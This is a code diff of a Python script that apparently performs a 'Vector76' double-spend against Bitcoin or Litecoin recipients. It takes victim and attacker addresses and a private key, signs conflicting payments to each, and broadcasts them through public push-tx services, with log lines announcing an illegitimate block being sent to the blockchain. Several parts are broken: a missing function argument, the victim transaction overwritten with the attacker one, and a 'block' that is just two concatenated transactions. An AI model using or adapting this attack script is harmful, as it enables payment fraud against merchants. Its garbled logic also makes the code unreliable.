@@ -26,19 +26,18 @@ parser.add_argument("attacker_address",
 parser.add_argument("amount_of_coins",
                     help="Amount of coins sent. (Enter in LTC units) The maximum amount delayed will vary depending on send_from.",
                     type=float)
-parser.add_argument("--symbol",
-                    help="coin symbol btc or ltc (Default = btc)",
+parser.add_argument("symbol",
+                    help="coin symbol btc or ltc",
                     type=str)
-parser.add_argument("--is_testnet",
-                    help="Testnet flag (Default=False)",
-                    default=False,
+parser.add_argument("is_testnet",
+                    help="Testnet flag True or False",
                     type=bool)
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return round(btc_amount / satoshi)
 def generate_block(address, block, submit=False):
-    subprocess.run(f'litecoin-cli generateblock "{address}" \'["{block}"]\' {str(submit).lower()}',
+    return subprocess.run(f'litecoin-cli generateblock "{address}" \'["{block}"]\' {str(submit).lower()} false',
                              shell=True,
                              capture_output=True,
                              text=True,
@@ -60,35 +59,20 @@ def submit_block(block):
                              check=True)
 
 def broadcast_transaction(raw_tx, testnet):
-
-    url = "https://live.blockcypher.com/btc/pushtx"
-    res = requests.get(url).text
-    bs = BeautifulSoup(res, 'html.parser')
-    csrf_token = bs.find(attrs={'name':'csrfmiddlewaretoken'}).get('value')
-    print(csrf_token)
+    url = "https://blockchain.info/pushtx"
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    payload = {'tx': raw_tx}
     if testnet:
-        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+        url = "https://blockstream.info/testnet/api/tx"
+        headers = {'Content-Type': 'text/plain'}
         payload = raw_tx
-        payload = {"tx_hex": raw_tx,
-               "coin_symbol": "btc-testnet",
-               "csrfmiddlewaretoken": csrf_token}
-    else:
-        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-        payload = {"tx_hex": raw_tx,
-               "coin_symbol": "btc",
-               "csrfmiddlewaretoken": csrf_token}
 
-    response = requests.post(url,
-                             allow_redirects=True,
-                             data=payload,
-                             headers=headers)
-    print(f"response url : {response.url}")
+    response = requests.post(url, data=payload, headers=headers)
+    print(response.text)
     if response.status_code == 200:
         print("Transaction successfully broadcasted!")
     else:
         print(f"Failed to broadcast transaction. Status code: {response.status_code}")
-
-
 
 args = parser.parse_args()
 fake_send_from   = args.from_wifkey
@@ -119,8 +103,8 @@ if coin_symbol == "ltc":
     balance = transaction_util.get_balance(address)
     inputs  = transaction_util.get_unspents(address)
 else:
-    balance = transaction_util.get_balance(transaction_util.privtoaddr(fake_send_from))
-    inputs  = transaction_util.get_unspents(transaction_util.privtoaddr(fake_send_from))
+    balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
+    inputs  = transaction_util.get_unspents(transaction_util.wiftoaddr(fake_send_from))
 
 print("OK")
 print(balance)
@@ -136,21 +120,23 @@ send_amount = to_satoshi(amount_btc)
 #    print(f"[!] insufficient funds. ")
 #    exit()
 #
-fee = -10000
+fee = 5000
 
-tx_victim   = [{"address": victim_address, "value": -send_amount}]
+tx_victim   = [{"address": victim_address, "value": send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
 
-tx_victim   = transaction_util.signall(transaction_util.mktx(inputs, tx_victim), fake_send_from)
-tx_attacker = transaction_util.signall(transaction_util.mktx(inputs, tx_attacker), fake_send_from)
+tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
+tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
 
-tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
-tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, fake_send_from))
+tx_victim   = transaction_util.signall(tx_victim, fake_send_from)
+tx_attacker = transaction_util.signall(tx_attacker, fake_send_from)
+#tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
+tx_victim   = cryptos.serialize(tx_attacker)
+tx_attacker = cryptos.serialize(tx_attacker)
 
-vector76    = f"{tx_victim}{tx_attacker}"
-[tx_victim, tx_attacker]
-vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
-vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
+block = f"{tx_victim}{tx_attacker}"
+#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
+#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
 print()
 print("[+] READY...")
@@ -159,9 +145,9 @@ print()
 print("--------------------")
 print(f"Send to                       : {victim_address}")
 print(f"Send Amount   (Satoshi unit)  : {send_amount} Satoshi")
-print(f"Signed victim   Signed RawTx  : {tx_victim}")
-print(f"vector76                      : {vector76}")
-print(f"Testnet Mode              : {testnet}")
+print(f"Victim transaction            : {tx_victim}")
+print(f"Vector76 transaction          : {tx_attacker}")
+print(f"Testnet Mode                  : {testnet}")
 print("--------------------")
 print()
 print()
@@ -170,22 +156,23 @@ print()
 #generated_vector76_block = generate_block(attacker_address, tx_attacker)["hex"]
 print()
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
-print("Sending V1 Transaction ...")
+print("Sending victim Transaction ...")
 
-#transaction_util.pushtx(tx_victim)
-txid = transaction_util.send(fake_send_from, address, victim_address, -send_amount)
-print(txid)
-input("--- Send the vector76 lock after pressing the enter key. --- ")
-print()
-print()
 print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
 print()
-time.sleep(0.7)
+time.sleep(2)
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
+time.sleep(2.5)
+txid = transaction_util.pushtx(tx_victim)#transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)
+print(txid)
+broadcast_transaction(tx_attacker)
+broadcast_transaction(block)
+#input("--- Send the vector76 lock after pressing the enter key. --- ")
+print()
+print()
 #print()
 #node.call("submitblock", data)
 #time.sleep(0.7)
-transaction_util.pushtx(vector76_block)
 #print("Submit Block ...")
 #submit_block(data)
 print()
